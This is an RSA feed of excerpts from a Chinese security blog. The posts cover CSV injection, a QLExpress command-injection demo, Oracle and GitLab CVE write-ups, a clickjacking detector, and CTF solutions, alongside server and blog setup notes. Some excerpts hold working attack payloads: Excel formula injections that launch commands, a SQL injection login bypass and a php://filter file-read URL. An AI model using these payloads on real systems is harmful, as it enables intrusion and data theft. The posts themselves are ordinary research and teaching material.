<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Posts on 闲言语</title><link>https://ret2neo.cn/post/</link><description>Recent content in Posts on 闲言语</description><generator>Hugo -- gohugo.io</generator><language>zh</language><lastBuildDate>Wed, 28 Jun 2023 22:24:58 +0800</lastBuildDate><atom:link href="https://ret2neo.cn/post/index.xml" rel="self" type="application/rss+xml"/><item><title>CSV注入最短PoC</title><link>https://ret2neo.cn/post/230628-csv-inject/</link><pubDate>Wed, 28 Jun 2023 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/230628-csv-inject/</guid><description>CSV注入漏洞基本原理 CSV注入的原理是当excel或者CSV格式文件中的单元格存在formula时，excel会进行计算，可能导致数据和代码的混淆。
什么时候单元格的内容会被计算呢？目前看到的是以下几种情况
1 2 3 4 5 6 7 8 =1+2 =&amp;gt; 3 -1+2 =&amp;gt; =-1+2 =&amp;gt; 1 +1+2 =&amp;gt; =1+2 =&amp;gt; 3 据说还有以下三种字符开头的会被计算，但还没构造出PoC。 @ \t (TAB,0x09) \r (Carriage Return.0x0D ) 我们在网上见得最多的PoC应该是来自 The Absurdly Underestimated Dangers of CSV Injection 一文：
1 &amp;#34;=2+5+cmd|&amp;#39; /C calc&amp;#39;!A0&amp;#34; 但其实参考 What does the formula =cmd|&amp;rsquo;/C calc&amp;rsquo;!A0 do in Excel and why? 结合实验，我们发现 A0 是不必要的，起作用的是感叹号。所以以下PoC都是可用的
1 2 3 4 5 =1+cmd|&amp;#39; /C calc&amp;#39;!neosayhi -cmd|&amp;#39; /C calc&amp;#39;!</description></item><item><title>QLExpress最新版本（3.3.1）默认不安全，存在命令注入</title><link>https://ret2neo.cn/post/230628-qlexpress-command-inject/</link><pubDate>Wed, 28 Jun 2023 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/230628-qlexpress-command-inject/</guid><description>QLExpress是什么 由阿里的电商业务规则、表达式（布尔组合）、特殊数学公式计算（高精度）、语法分析、脚本二次定制等强需求而设计的一门动态脚本引擎解析工具。 在阿里集团有很强的影响力，同时为了自身不断优化、发扬开源贡献精神，于2012年开源。
——https://github.com/alibaba/QLExpress
命令注入 由于 com.ql.util.express.config.QLExpressRunStrategy#forbidInvokeSecurityRiskMethods 默认为 false ，导致默认不安全，建议默认值改为 true 。
按照 https://github.com/alibaba/QLExpress#1-黑名单控制 说明：
但实际上并不是默认安全的，微调官方demo成为漏洞demo：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package pers.neo.el; import com.ql.util.express.DefaultContext; import com.ql.util.express.ExpressRunner; public class qlexpress { public static void main(String[] args) throws Exception { ExpressRunner runner = new ExpressRunner(); DefaultContext&amp;lt;String, Object&amp;gt; context = new DefaultContext&amp;lt;String, Object&amp;gt;(); context.put(&amp;#34;a&amp;#34;, 1); context.put(&amp;#34;b&amp;#34;, 2); context.put(&amp;#34;c&amp;#34;, 3); String express = &amp;#34;a + b * c&amp;#34;; express=&amp;#34;java.</description></item><item><title>使用GitHub Action方便地整站克隆</title><link>https://ret2neo.cn/post/230602-save-web-using-github-action/</link><pubDate>Fri, 02 Jun 2023 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/230602-save-web-using-github-action/</guid><description>想要整站克隆某个站点，有一些已有的工具。
WGET 参考这篇文章（ Make Offline Mirror of a Site using wget ） ，克隆网站可以直接使用wet命令
1 wget --mirror --convert-links --adjust-extension --page-requisites --no-parent http://example.org 短命令
1 wget -mkEpnp http://example.org 效果还可以，中文编码处理可能会有点问题。
webhttrack 1 2 apt-get install -y webhttrack 主导Windows平台，Linux平台运行直接报错了，没有继续尝试 httrack https://www.kali.org/tools/httrack/
1 2 apt install httrack httrack http://140.143.242.46/ 不会自己新建目录，所以要进入到要存放站点的文件夹下，再运行。
GitHub action 用法：在github repo根目录下编辑 urls.txt 文件，格式为
1 2 [URL] [dir name] [comment] https://www.yinwang.org/ www.yinwang.org 王垠博客：当然我在扯淡 会以 www.yinwang.org 为目录克隆 https://www.yinwang.org/ 。
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 name: clone site on: workflow_dispatch: push: branches: - master paths: - &amp;#39;**/urls.</description></item><item><title>Cheatsheet</title><link>https://ret2neo.cn/post/230512-cheatsheet/</link><pubDate>Fri, 12 May 2023 21:35:28 +0800</pubDate><guid>https://ret2neo.cn/post/230512-cheatsheet/</guid><description>burpsuite scope 排除的scope
1 .*\.(huawei|vmall|google|googleapis|gvt2|gstatic|googleusercontent|google-analytics|baidu|wappalyzer)\.com 隐藏的ext
1 woff,woff2,gif,jpg,png,svg,jpeg,css,ico,ttf,mp3,mp4,webm linux crontab的使用 参考 https://askubuntu.com/a/216711 ，每个用户有自己的crontab，如bob用户的位于 /var/spoll/cron/crontabs/bob ，但是不建议直接编辑该文件。而应该通过crontab -e来编辑。 也可以用crontab -l &amp;gt; backup ，然后编辑backup文件，再 crontab backup 来导入，就会和 crontab -e 编辑执行一样的语法检查。
bash命令、语法和脚本编写 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 ############################################################## ### Linux是伟大的发明，尝试用golang实现bash的功能是浪费生命。 ### ############################################################## #-------------------------------------------------------------# # 算数表达式 $((123 + 1)) #-------------------------------------------------------------# # 删除字符串的某个子字符串 tr -d &amp;#39;\r\n&amp;#39; #-------------------------------------------------------------# # 如果用alias，右侧命令用单引号包裹，免得出现奇怪的问题。 #-------------------------------------------------------------# # alias无法传参，需传参的场景优先用function，function中使用$1指代传入的第一个参数 #-------------------------------------------------------------# # screen中如何创建日志？ 按 CTRL + A + H 创建日志文件。需要注意，A 和 H 都是大写。 #-------------------------------------------------------------# # 添加用户sd，并且添加家目录 useradd sd -m # 把sd添加到sudo组 usermod -aG sudo sd # 删除用户，包括home目录，强制删除 userdel -rf sd #-------------------------------------------------------------# # parallel 安装与使用 sudo apt install parallel cat &amp;lt;file-name&amp;gt; | parallel -j 200 curl -L -o /dev/null {} -x 127.</description></item><item><title>基于 GitHub Action 和 hugo 构建全新的博客</title><link>https://ret2neo.cn/post/230509-brandnew-blog-based-on-hugo-and-githubci/</link><pubDate>Tue, 09 May 2023 19:20:11 +0800</pubDate><guid>https://ret2neo.cn/post/230509-brandnew-blog-based-on-hugo-and-githubci/</guid><description>很长一段时间，我的博客是用的hexo，也用博客记录过 搭建过程 ，但有几个不太舒服的地方
一是依赖过重，每次在一台新电脑上安装node+npm+hexo环境都会出现一些新问题 二是构建速度比较慢 这次尝试用hugo+PaperMod主题+github action搭建一个新的博客，保持简洁的风格，同时能够利用CI自动构建，此后写博客所做的事情只是新建和编辑markdown文件，push到git仓库就可以了。
此外增强了PaperMod的搜索功能，目前还算满意。
放两张新旧博客界面的截图，作为纪念。
PaperMod配置和魔改 自定义html/js/css 可以在网站根目录下相应目录建立文件，构建时会被merge，并且优先级高于papermod的对应文件，就可以在不更改原有主题的前提下起到覆盖和增加主题文件的效果了。
比如我这里自定义了 blank.css/fastsearch.js/list.html/toc.html 这几个文件
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 $ ls -lhR assets/css/extended/ assets/js/ layouts/ themes/hugo-PaperMod-7.0/assets/css/extended/ themes/hugo-PaperMod-7.0/assets/js/ themes/hugo-PaperMod-7.0/layouts/partials/toc.html -rwxrwxrwx 1 bob bob 4.3K Feb 12 14:53 themes/hugo-PaperMod-7.0/layouts/partials/toc.html assets/css/extended/: total 4.0K -rwxrwxrwx 1 bob bob 1.</description></item><item><title>k8s集群实验环境搭建</title><link>https://ret2neo.cn/post/220915-build-k8s-lab-locally/</link><pubDate>Thu, 15 Sep 2022 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/220915-build-k8s-lab-locally/</guid><description>安装一台Ubuntu 下载地址
1 http://releases.ubuntu.com/16.04/ubuntu-16.04.7-desktop-amd64.iso.torrent 使用VMware安装一台Ubuntu，修改用户名，重启，然后安装必要工具
1 sudo apt install -y openssh-server net-tools vim curl 添加公钥之后（不需要重启SSH服务）就可以SSH登录了。
在机器上面安装docker
1 curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun 在机器上面安装kubeadmin
1 2 3 curl -s https://mirrors.aliyun.com/kubernetes/apt/doc/apt-key.gpg | apt-key add - echo &amp;#34;deb https://mirrors.aliyun.com/kubernetes/apt/ kubernetes-xenial main&amp;#34; &amp;gt; /etc/apt/sources.list.d/kubernetes.list apt update -q &amp;amp;&amp;amp; apt install -y apt-transport-https kubelet kubeadm kubectl 关闭SWAP并重启
1 2 3 4 5 6 7 8 永久关闭swap sed -i &amp;#39;/swap/ s/^/#/&amp;#39; /etc/fstab reboot -h now --- 临时关闭，重启失效swapoff -a 永久关闭 注释/etc/fstab中swap相关的那一行 不关闭但设为0 echo &amp;#34;vm.</description></item><item><title>基于bash的笔记系统：一种快速增删改查临时笔记的方法</title><link>https://ret2neo.cn/post/220914-blog-system-based-on-bash/</link><pubDate>Wed, 14 Sep 2022 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/220914-blog-system-based-on-bash/</guid><description>将以下命令加入 ~/.bashrc 文件，或者加入自定义的~/config/mybashrc 文件后再在~/bashrc中执行source ~/config/mybashrc 。
（使用前需配置blog_path路径和typora路径，配合WSL食用效果更佳）
1 2 3 4 5 6 7 8 alias update_mybashrc=&amp;#34;source /home/bob/.automan/mybashrc&amp;#34; # 博客相关功能，增删改查 blog_path=&amp;#39;/mnt/d/typote/note/neokb/blog&amp;#39; # 从编号100开始，逐个递增，每次新建会取当前最大的值加一，上限999 function yblog_new(){ touch $blog_path/100.md; echo $1 &amp;gt; $blog_path/$(($(ls $blog_path/*.md | grep -Po &amp;#34;\d{3}(?=.md)&amp;#34;|sort -r|head -n1) +1)).md; } function yblog_del(){ rm -i $blog_path/$1.md; } function yblog_open(){ cd $blog_path; &amp;#39;/mnt/c/Program Files/Typora/Typora.exe&amp;#39; $1.md; cd -; } function yblog_list(){ for i in $(ls $blog_path/*.md);do echo $i |grep -Po &amp;#34;\d{3}(?=.md)&amp;#34;|tr &amp;#34;\n&amp;#34; &amp;#34;\t&amp;#34;;head -n1 $i|tr -d &amp;#34;\n&amp;#34;;echo &amp;#34;&amp;#34;;done } 可以查询、删除已有的笔记，指定主题新建一个笔记，也可以指定编号用typora打开对应的文件。</description></item><item><title>自研小工具如何命名</title><link>https://ret2neo.cn/post/220914-howto-name-tools/</link><pubDate>Wed, 14 Sep 2022 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/220914-howto-name-tools/</guid><description>无论是golang编写的工具，还是bash的alias或者function，使用命令时经常靠TAB补全。为了补全时混淆信息更少，统计了一下Linux常见工具的命名习惯，选择出使用频率最低的首字母等，作为自研工具命名的优先字符。 首先获取当前Linux上所有的可执行文件
1 find / -executable -type f -exec file {} \; 2&amp;gt;/dev/null | grep ELF |tee -a all.executable.files 然后取出名字列表
1 cat all.executable.files |cut -d : -f 1 |sort -u|grep -Po &amp;#34;[^/]+$&amp;#34; | sort -u &amp;gt; all.executable.files.names 统计名字列表中首字母、第二个字母、第三个字母的使用频率
1 2 3 grep -Po &amp;#34;^\S&amp;#34; all.executable.files.names|sort |uniq -c |sort -nrk1|grep -Po &amp;#34;\S$&amp;#34;|tr -d &amp;#34;\n&amp;#34; grep -Po &amp;#34;^\S\S&amp;#34; all.executable.files.names|grep -Po &amp;#34;\S$&amp;#34;|sort |uniq -c |sort -nrk1 |grep -Po &amp;#34;\S$&amp;#34;|tr -d &amp;#34;\n&amp;#34; grep -Po &amp;#34;^\S\S\S&amp;#34; all.</description></item><item><title>CVE-2021-35587：Oracle Access Manager反序列化漏洞</title><link>https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/</link><pubDate>Thu, 14 Jul 2022 19:40:55 +0800</pubDate><guid>https://ret2neo.cn/post/230515-oracle-access-manager-cve-2021-35587/</guid><description>漏洞概况 CVE公告
Vulnerability in the Oracle Access Manager product of Oracle Fusion Middleware (component: OpenSSO Agent). Supported versions that are affected are 11.1.2.3.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Access Manager. Successful attacks of this vulnerability can result in takeover of Oracle Access Manager. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).
—— https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-35587</description></item><item><title>如何搭建 Oracle Access Manager</title><link>https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/</link><pubDate>Thu, 17 Mar 2022 18:11:09 +0800</pubDate><guid>https://ret2neo.cn/post/220317-howto-install-oracle-access-manager/</guid><description>大纲 参考 https://docs.oracle.com/en/middleware/idm/access-manager/12.2.1.4/tutorial-oam-docker/#Background 使用方法2获取OAM镜像
Download a prebuilt OAM image from Oracle Container Registry by by navigating to Middleware &amp;gt; oam. This image contains no patches and should only be used in Developer or Test environments. 下载到的OAM镜像用于跑起来三个OAM容器
WebLogic Administration Server (AdminServer) OAM Managed Server (oam_server1) OAM Policy Manager Managed Server (oam_policy_mgr1) 跑起来这三个容器依赖一个可用的Oracle数据库
步骤汇总 创建一台全新的Ubuntu18.04，切换到root用户。
在 https://hub.docker.com/_/oracle-database-enterprise-edition 和 https://container-registry.oracle.com/ 登录账号后同意协议。（参考步骤二）
安装docker
1 2 apt update apt install docker.io docker 登录dockerhub 和 container-registry.oracle.com</description></item><item><title>CVE-2021-22205：GitLab远程代码执行漏洞分析</title><link>https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/</link><pubDate>Sun, 31 Oct 2021 20:19:20 +0800</pubDate><guid>https://ret2neo.cn/post/211031-cve-2021-22205-mitigation/</guid><description>概况 Remote code execution when uploading specially crafted image files
An issue has been discovered in GitLab CE/EE affecting all versions starting from 11.9. GitLab was not properly validating image files that is passed to a file parser which resulted in a remote command execution. This is a critical severity issue (AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H, 9.9). It is now mitigated in the latest release and is assigned CVE-2021-22205.
Thanks vakzz for reporting this vulnerability through our HackerOne bug bounty program.</description></item><item><title>使用docker构建proxenet</title><link>https://ret2neo.cn/post/210721-build-proxenet-using-docker/</link><pubDate>Wed, 21 Jul 2021 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/210721-build-proxenet-using-docker/</guid><description>dockerfile内容 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 from debian:latest # https://proxenet.readthedocs.io/en/latest/compil/ ENV DEBIAN_FRONTEND noninteractive RUN apt-get update -y \ &amp;amp;&amp;amp; apt-get install -y git cmake libmbedtls-dev tclsh pkg-config libmbedx509-0 ruby-dev liblua5.2-dev libperl-dev python3-dev python-dev ncat jq \ &amp;amp;&amp;amp; cp /usr/include/x86_64-linux-gnu/ruby-2.5.0/ruby/config.h /usr/include/ruby-2.5.0/ruby/config.h \ &amp;amp;&amp;amp; git clone https://github.com/hugsy/proxenet.git \ &amp;amp;&amp;amp; cd proxenet \ &amp;amp;&amp;amp; cmake .</description></item><item><title>点击劫持漏洞的批量检测</title><link>https://ret2neo.cn/post/210528-click-jacking-batch-detect/</link><pubDate>Fri, 28 May 2021 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/210528-click-jacking-batch-detect/</guid><description>概述 batchDetectClickjacking可以用于自动化批量检测和利用点击劫持类漏洞。支持
对多个HTTP站点批量快速检测 对存在点击劫持类漏洞的网站生成利用代码PoC 指定检测时使用的并发线程数 从管道或文件输入被测站点 指定单个网站检测的超时时间 指定检测时使用的网络代理 指定检测时使用的User-Agent 常见用法 1 2 3 4 5 6 7 8 # 检测单个网站链接是否受点击劫持漏洞影响 echo https://www.qq.com | ./batchDetectClickjacking # 检测文件urls.txt中的多个链接 cat urls.txt | ./batchDetectClickjacking # 使用100个线程检测大量url链接，只显示存在漏洞的网站，同时为每个漏洞网站生成PoC ./batchDetectClickjacking -iL urls.txt -s -g -t 100 支持参数 1 2 3 4 5 6 7 8 -h 查看帮助 -g 为存在漏洞的网站生成PoC -iL 指定一个文件，其中包含若干待检测的网站地址，每行一个 -s 只显示存在漏洞的网站；默认情况下还会显示不存在漏洞的网站链接并显示响应头的X-Frame-Options值。 -t 指定检测时候使用的线程数，默认情况下是50个线程 -u 指定发起请求使用的UA，默认情况下是Firefox -w 指定每个请求的超时时间，默认情况下是30s -x 指定发起请求使用的网络代理，可以用于和burpsuite联动 漏洞原理及危害 点击劫持攻击，也称UI覆盖攻击，允许恶意页面以用户的名义点击“受害网站”，欺骗用户进行转账、点赞、关注、转发等操作，或者窃取用户凭据。
一个典型的利用场景是欺骗用户进行转账、点赞、关注或转发。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B中使用iframe标签包含A页面，但将A页面置顶并设为透明，这样用户认为自己在B网站上点击时，实际上是在被欺骗着点击了A网站。从而恶意网站B能够做到以用户名义点击A网站，进行转账、转发等敏感操作。
另一种典型的利用场景是窃取用户账号密码等身份凭据。如果业务网站的某正常功能页面A存在点击劫持漏洞，攻击者可以在恶意网站B包含A页面，将A页面置底并将B网站设为透明，这样用户认为自己在A网站进行输入时，实际上输入数据会被B网站获取到。
漏洞修复方法 主要有两种方式可以防御点击劫持，第一种是X-Frame-Options头信息（推荐使用，但可能有些浏览器不支持）；第二种方式是使用javascript编写嵌入阻断代码（代码编写不当时可能被绕过，但当流量经过的某些web代理可能被去掉X-Frame-Options头时可以考虑这种方式）。</description></item><item><title>如何保存tiddlywiki</title><link>https://ret2neo.cn/post/210323-how-to-save-tiddly-wiki/</link><pubDate>Tue, 23 Mar 2021 21:23:17 +0800</pubDate><guid>https://ret2neo.cn/post/210323-how-to-save-tiddly-wiki/</guid><description>一直在寻找称心的笔记工具，前段时间接触到tiddly wiki，觉得很是不错。因为并非完美的开箱即用，使用过程中还是遇到一些问题，其中一些找到了好的解决办法，有一些实在解决不掉，无奈最终弃坑。
自动保存 官方提供了很多的保存选项，却实在没有一个真正优雅，要装浏览器插件，装客户端，甚至还有装浏览器的……
nodejs版勉强能用，实时保存效果极好，但有两个缺点：
文件分散 安装插件的页面刷不出来，只能靠改配置文件或者去找别人的拖过来。 1 2 3 4 5 npm install -g tiddlywiki tiddlywiki --version // 5.1.23 tiddlywiki mywiki --init server tiddlywiki mywiki --listen port=1337 最终找到一种比较满意的保存方式。
参考 jimfoltz/tw5-server.rb 脚本略作修改，监听localhost，去除日志。
将以下文件保存为/path/to/wikiserv.rb，配置root和BACKUP_DIR的值，并把wiki.html放到root对应的目录下。 建个软链接 ln -s /path/to.wikiserv.rb ~/wiki 在home目录执行 ruby wiki&amp;amp; ，访问http://localhost:1337/wiki.html 保存时会备份一份到BACKUP_DIR 目录下。 用坚果云同步root对应的目录，Windows下可结合WSL使用。 使用插件 $:/plugins/telmiger/EditorCounter ，每输入一定数量的字符就自动保存一次。 wikiserv.rb ：
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 # 参考：https://gist.</description></item><item><title>burp进阶技巧</title><link>https://ret2neo.cn/post/210225-burp-advanced-trick/</link><pubDate>Thu, 25 Feb 2021 22:24:58 +0800</pubDate><guid>https://ret2neo.cn/post/210225-burp-advanced-trick/</guid><description>filter： 根据MIME Type、状态码、后缀、注释、正则、端口来过滤要显示的内容。 @target-sitemap-filter @proxy-httphistory-filter search： @target-sitemap-engagement tool @target-sitemap-filter @proxy-httphistory-filter @burp-search @message editor regex。 ^(?&amp;lt;=http)(?:www)\w\W\s\S+\.\*\?\t\n\r(?&amp;lt;name&amp;gt;cool)[0-9a-zA-Z](?#foobar)[^\d]\b\.*?(hunter|honor){6,8}(?!2333)$ 元字符、转义、重复、字符类、分支、分组、反义、零宽断言、后向引用、贪婪匹配等 学习与测试正则表达式：https://regexr.com/ scope： eg1, include hihonor eg2, include .* ，exclude .*google.* remove from scope @proxy-httphistory @target-sitemap toggle scope wherever search/filter is available only record inscope items @proxy-option-misc hotkey： ctrl+(-|=|a|b|c|d|i|r|s|u|v|x|y|z) ctrl+shift+(b|d|h|i|p|r|t|u|v) @user option-misc-hotkeys multi proxy listener &amp;amp; filter/search by port @proxy-option download ca from http://burp highlight/comment history item reponse modification. eg:unhide hidden filed @proxy-option match and replace.</description></item><item><title>第十二届全国大学生信息安全竞赛创新实践能力赛 web writeup</title><link>https://ret2neo.cn/post/190427-ciscn2019-web-wp/</link><pubDate>Sat, 27 Apr 2019 00:35:37 +0800</pubDate><guid>https://ret2neo.cn/post/190427-ciscn2019-web-wp/</guid><description>上周末(4/20~4/21)战队难得一起再打了个比赛，大概是大学生活里最后一场了吧，这里复盘下三个Web。
JustSoso 使用伪协议 (http://xxx.changame.ichunqiu.com/index.php?file=php://filter/convert.base64-encode/resource=index.php) 读取到index.php和hint.php。
index.php:
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 &amp;lt;html&amp;gt; &amp;lt;?php error_reporting(0); $file = $_GET[&amp;#34;file&amp;#34;]; $payload = $_GET[&amp;#34;payload&amp;#34;]; if(!isset($file)){ echo &amp;#39;Missing parameter&amp;#39;.&amp;#39;&amp;lt;br&amp;gt;&amp;#39;; } if(preg_match(&amp;#34;/flag/&amp;#34;,$file)){ die(&amp;#39;hack attacked!!!&amp;#39;); } @include($file); if(isset($payload)){ $url = parse_url($_SERVER[&amp;#39;REQUEST_URI&amp;#39;]); parse_str($url[&amp;#39;query&amp;#39;],$query); foreach($query as $value){ if (preg_match(&amp;#34;/flag/&amp;#34;,$value)) { die(&amp;#39;stop hacking!&amp;#39;); exit(); } } $payload = unserialize($payload); }else{ echo &amp;#34;Missing parameters&amp;#34;; } ?</description></item><item><title>拨钟问题</title><link>https://ret2neo.cn/post/190326-clock-manage-problem/</link><pubDate>Tue, 26 Mar 2019 13:15:55 +0800</pubDate><guid>https://ret2neo.cn/post/190326-clock-manage-problem/</guid><description>拨钟问题 解法一 全局暴力搜索
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 import itertools initstate=[3,3,0,2,2,2,2,1,2] update=[ [1,2,4,5], [1,2,3], [2,3,5,6], [1,4,7], [2,4,5,6,8], [3,6,9], [4,5,7,8], [7,8,9], [5,6,8,9] ] for i in itertools.product([0,1,2,3],repeat=9): initstate=[3,3,0,2,2,2,2,1,2] for j in range(9): for k in update[j]: initstate[k-1]+=i[j] initstate[k-1]%=4 if sum(initstate)==0: print &amp;#39; &amp;#39;.join([&amp;#39; &amp;#39;.join(str(m+1)*i[m]) for m in range(9) if i[m]!=0]) break # 4 5 8 9 解法二 局部暴力搜索</description></item><item><title>使用谷歌云进行深度学习训练，以aster为例</title><link>https://ret2neo.cn/post/190308-run-aster-on-gce-or-locally/</link><pubDate>Fri, 08 Mar 2019 16:33:07 +0800</pubDate><guid>https://ret2neo.cn/post/190308-run-aster-on-gce-or-locally/</guid><description>光阴似箭，我也做起了毕业设计。随波逐流，我也玩起了深度学习。</description></item><item><title>TAMUctf writeup</title><link>https://ret2neo.cn/post/190223-tamuctf/</link><pubDate>Sat, 23 Feb 2019 09:19:41 +0800</pubDate><guid>https://ret2neo.cn/post/190223-tamuctf/</guid><description>Web Not Another SQLi Challenge 尝试登陆时页面会发生跳转，可在chrome浏览器开发者工具中的Network栏勾选Preserve log保存报文内容，以便用于burp重放。
万能密码登录。
1 2 $curl -s &amp;#34;http://web1.tamuctf.com/web/login.php&amp;#34; -d &amp;#34;username=admin&amp;#39; or 1=1#&amp;amp;password&amp;#34; | grep -o &amp;#34;gigem{.*}&amp;#34; gigem{f4rm3r5_f4rm3r5_w3&amp;#39;r3_4ll_r16h7} Robots Rule 1 2 3 4 5 6 $curl &amp;#34;http://web5.tamuctf.com/robots.txt&amp;#34; User-agent: * WHAT IS UP, MY FELLOW HUMAN! HAVE YOU RECEIVED SECRET INFORMATION ON THE DASTARDLY GOOGLE ROBOTS?! YOU CAN TELL ME, A FELLOW NOT-A-ROBOT! 按提示伪装成Google机器人访问 robots.txt 。
1 2 curl &amp;#34;http://web5.tamuctf.com/robots.txt&amp;#34; -A &amp;#34;Googlebot/2.1 (+http://www.google.com/bot.html)&amp;#34; -s | grep -o &amp;#34;gigem{.</description></item><item><title>2018 柏鹭杯 writeup</title><link>https://ret2neo.cn/post/181125-bailucup-writeup/</link><pubDate>Sun, 25 Nov 2018 20:25:37 +0800</pubDate><guid>https://ret2neo.cn/post/181125-bailucup-writeup/</guid><description>CTF Crypto Crypto1 problem 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 from flag import flag from Crypto.Util.number import * import random def next_prime(n): num = n + 1 while True: if isPrime(num): return num num += 1 p = random.randint(1&amp;lt;&amp;lt;3071,1&amp;lt;&amp;lt;3072) p = next_prime(p) q = next_prime(p*10) N = p*q e = 65537 c = pow(bytes_to_long(flag),e,N) print N#247157208312655169175097941364280738161257111976460225724719907081110265510517450181419502794457206227461600647913804553439171851865273449559295717229024951735351965745325255241561391509015823198303928588939850683031392486366218841593013566932215141428061199015117025898704736991786081007198271335363347647516874679013119543722851148642512142186199102168074461255284546705588056994149297326331376082141145137980534967406372164077378650248545875219877244489040506317293082270408705203779841533080244655519849164084793887915122847280359452339072498784918027724621588636245527176960457003310429876627882173282069366037431766179722648353575718417895929519296072344510519198593252963273537190447967056699273665756186541135880261688073100218736960343554003491651502334045257343825793705434779809139021362473746587814528428007114308414633338220797896397738142172067161950968365434368211510967904096253326804711795198906393597153228365711080786247894858858419136771806150038968465644512536135428099037524022644906606239281576512245480765249280626544900781649017542649977530381598608436485399917576052247750573936190833224008929770080605906041913084656134359260509037195783858871830359437278131656343708211575987756873026171223324073191307367943843353573378426157170935012284820053625264544030714057464690450568057598110227083895395913850243271935830358181622027323185508807486853971929523201869477689585619024238113916052252320578711256593537267591407960305853736136636628575478996733430026632486500743561965770413140633948002705696925426367918545515713035754606128166993229587155817506068035187995926746472892280477401942441831391756895131543049750847590716935278314226902082626392655666615086297442052602217416486188297831289978272258543231414975069191549588547253936829655332588805672513945883351937495650167502066292697223592894483418517613405613285519159 print csolve 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 ncimport gmpy2 from Crypto.</description></item><item><title>如果RSA加密中的e和phi不互质</title><link>https://ret2neo.cn/post/181124-what-if-e-phi-not-coprime/</link><pubDate>Sat, 24 Nov 2018 20:30:39 +0800</pubDate><guid>https://ret2neo.cn/post/181124-what-if-e-phi-not-coprime/</guid><description>这是和别人家的学弟交流的一道题，据称是2018高校网络信息安全管理运维挑战赛的RSA题目，可以帮助理解在RSA加密（姑且还这样称呼它吧）中当加密指数e和欧拉函数phi不互质的时候意味着什么，以及可能的解决方案。
如果没有理解错误的话，不互质并不会导致加密不安全，只是无法解密了，而且明文和密文在模数范围内也不再是一一对应。
此时如果有多个加密过程，他们的明文m和加密指数e相等，n不相等，那么只要能够构建一定数量的同余式，就可以用中国剩余定理求解，类似于广播攻击。
另一种思路就是本题的情况。多个同余式中的若干个n是可分解的，那么排列组合他们的p，q，以使得某种组合的phi能够和e互质，然后可以把模数降到这种组合的n值，就可以解出明文了。当然，这题的情况大概不是常有的。
题目内容如下：
1 2 3 4 5 6 7 8 9 10 11 n1=0xcfc59d54b4b2e9ab1b5d90920ae88f430d39fee60d18dddbc623d15aae645e4e50db1c07a02d472b2eebb075a547618e1154a15b1657fbf66ed7e714d23ac70bdfba4c809bbb1e27687163cb09258a07ab2533568192e29a3b8e31a5de886050b28b3ed58e81952487714dd7ae012708db30eaf007620cdeb34f150836a4b723L e1=0xfae3aL c1=0x81523a330fb15125b6184e4461dadac7601340960840c5213b67a788c84aecfcdc3caf0bf3e27e4c95bb3c154db7055376981972b1565c22c100c47f3fa1dd2994e56090067b4e66f1c3905f9f780145cdf8d0fea88a45bae5113da37c8879c9cdb8ee9a55892bac3bae11fbbabcba0626163d0e2e12c04d99f4eeba5071cbeaL n2=0xd45304b186dc82e40bd387afc831c32a4c7ba514a64ae051b62f483f27951065a6a04a030d285bdc1cb457b24c2f8701f574094d46d8de37b5a6d55356d1d368b89e16fa71b6603bd037c7f329a3096ce903937bb0c4f112a678c88fd5d84016f745b8281aea8fd5bcc28b68c293e4ef4a62a62e478a8b6cd46f3da73fa34c63L e2=0x1f9eaeL c2=0x4d7ceaadf5e662ab2e0149a8d18a4777b4cd4a7712ab825cf913206c325e6abb88954ebc37b2bda19aed16c5938ac43f43966e96a86913129e38c853ecd4ebc89e806f823ffb802e3ddef0ac6c5ba078d3983393a91cd7a1b59660d47d2045c03ff529c341f3ed994235a68c57f8195f75d61fc8cac37e936d9a6b75c4bd2347L assert pow(flag,e1,n1)==c1 assert pow(flag,e2,n2)==c2 assert gcd(e1,(p1-1)*(q1-1))==14 assert gcd(e2,(p2-1)*(q2-1))==14 解答代码如下，为了给学弟看，做了具体的注释。
